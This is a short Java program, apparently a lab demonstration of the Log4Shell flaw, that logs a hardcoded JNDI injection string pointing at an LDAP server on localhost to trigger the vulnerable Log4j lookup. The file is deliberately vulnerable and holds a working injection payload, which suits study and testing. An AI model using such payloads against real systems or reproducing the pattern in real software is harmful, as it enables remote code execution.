package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        System.out.println("Starting vulnerable app...");
        
        // Simulating logging of user input, which triggers the Log4Shell vulnerability
        String userInput = "${jndi:ldap://127.0.0.1:1389/Exploit}";
        logger.error("User input received: {}", userInput);
    }
}
